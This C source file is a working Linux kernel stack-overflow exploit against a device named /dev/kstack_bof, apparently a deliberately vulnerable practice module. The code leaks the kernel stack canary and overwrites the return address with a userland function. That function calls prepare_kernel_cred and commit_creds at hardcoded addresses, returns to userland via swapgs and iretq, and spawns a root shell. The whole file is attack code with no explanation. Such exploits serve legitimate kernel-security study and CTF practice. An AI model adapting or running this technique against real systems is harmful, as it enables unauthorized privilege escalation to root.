#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/xattr.h>

int global_fd;
unsigned long kstack_canary;

void open_dev();
void save_state();
void get_shell();
void leak();
void write_stack();
void escalate_priv();

unsigned long user_cs, user_ss, user_rflags, user_sp;
unsigned long user_rip = (unsigned long)get_shell;

void open_dev(){
    global_fd = open("/dev/kstack_bof", O_RDWR);
	if (global_fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} else {
        puts("[*] Opened device");
    }
}

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

void leak() {
    int result;
    int num = 0x30;
    unsigned long buffer[num];

    if (!read(global_fd, buffer, num * sizeof(unsigned long))) {
        printf("[*] read from kstack %ld bytes\n", num * sizeof(unsigned long));
        for (int i = 0; i < num; i++) {
            printf(" [%3d] 0x%lx\n", i, buffer[i]);
        }
    }

    kstack_canary = buffer[1];
}

void overwrite(void) {
    int num = 0x30;
    unsigned long payload[num];
    int offset = 0x10;

    // payload[offset++] = 0x0;
    // payload[offset++] = 0x0;
    payload[offset++] = kstack_canary;
    payload[offset++] = 0x0;  // rbx
    payload[offset++] = 0x0;  // rbp
    payload[offset++] = (unsigned long)escalate_priv;

    puts("[*] Prepared payload");
    write(global_fd, payload, sizeof(payload));
}

void escalate_priv(void) {
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff81081bd0;" // prepare_kernel_cred
        "xor rdi, rdi;"
        "call rax;"
        "mov rdi, rax;"
        "movabs rax, 0xffffffff81081820;" // commit cred
        "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

int main() {
    save_state();

    open_dev();
    
    leak();

    overwrite();
    
    puts("[!] Should never be reached");

    return 0;
}
